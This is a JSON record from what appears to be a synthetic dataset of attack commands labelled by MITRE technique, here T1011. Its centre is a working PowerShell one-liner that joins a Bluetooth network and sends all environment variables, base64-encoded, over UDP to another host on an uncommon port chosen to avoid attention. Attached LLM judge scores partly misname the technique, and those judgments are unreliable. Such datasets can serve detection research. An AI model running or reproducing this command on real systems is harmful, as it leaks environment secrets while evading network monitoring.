{
  "technique_id": "T1011",
  "platform": "Windows",
  "shell": "Powershell",
  "command": "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 172.31.200.2 255.255.255.252 | Out-Null; $msg=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Get-ChildItem Env: | Out-String))); $u=New-Object Net.Sockets.UdpClient; $u.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('172.31.200.2'),0)); $dat=[Text.Encoding]::UTF8.GetBytes($msg); $u.Send($dat,$dat.Length,'172.31.200.1',53209) | Out-Null; $u.Close()",
  "explanation": "Sends base64-encoded environment data via UDP over a Bluetooth-only subnet, ensuring all traffic uses the alternate Bluetooth medium (T1011).",
  "rationale_steps": [
    "Connect to Bluetooth NAP to establish the alternate network medium.",
    "Set a restricted IP on the Bluetooth adapter via netsh.",
    "Bind UDP socket to the Bluetooth IP to force medium use.",
    "Transmit to a high, uncommon UDP port to minimize attention."
  ],
  "obfuscation_level": "none",
  "id": "SYN-POWERSHELL-T1011-f4a0ca3c-1316e4be",
  "source_prompt_hash": "f4a0ca3c",
  "timestamp_utc": "2025-09-30T08:29:05.159712Z",
  "validation": {
    "syntax_ok": null,
    "llm_judgments": [
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "The PowerShell one-liner is well-formed with balanced quotes and parentheses, proper separators, and valid .NET/command usage.",
        "semantic_score": 3,
        "semantic_justification": "It plausibly connects to a Bluetooth PAN and exfiltrates base64-encoded environment data via UDP bound to that interface, but it depends on setting a static IP via netsh (likely requiring admin and potentially incorrect without a gateway) and does not align with the provided 'system script proxy execution' technique description.",
        "combined_score": 4.0,
        "confidence": 0.6,
        "timestamp": "2025-10-01T21:40:42.972931Z"
      },
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, parentheses, and braces, proper command separators, valid PowerShell syntax for variable assignment, pipeline operations, and method calls.",
        "semantic_score": 2,
        "semantic_justification": "While the command is technically valid PowerShell that connects to Bluetooth, sets IP configuration and exfiltrates data via UDP, it does not align with T1011 (Exfiltration Over Other Network Medium) as it doesn't use a system script proxy for execution.",
        "combined_score": 3.5,
        "confidence": 0.9,
        "timestamp": "2025-10-02T03:59:40.439277Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with correct PowerShell syntax, balanced parentheses and quotes, valid command separators, and appropriate cmdlet/external command usage.",
        "semantic_score": 1,
        "semantic_justification": "While the command technically performs data exfiltration over a Bluetooth connection, it fundamentally fails to align with MITRE ATT&CK T1011 (System Script Proxy Execution), which involves abusing trusted system scripts to proxy execution, as opposed to directly executing an external application or PowerShell cmdlets.",
        "combined_score": 3.0,
        "confidence": 1,
        "timestamp": "2025-10-02T04:00:08.747919Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 2.0,
    "llm_average_score": 3.5,
    "llm_verdict": "uncertain",
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}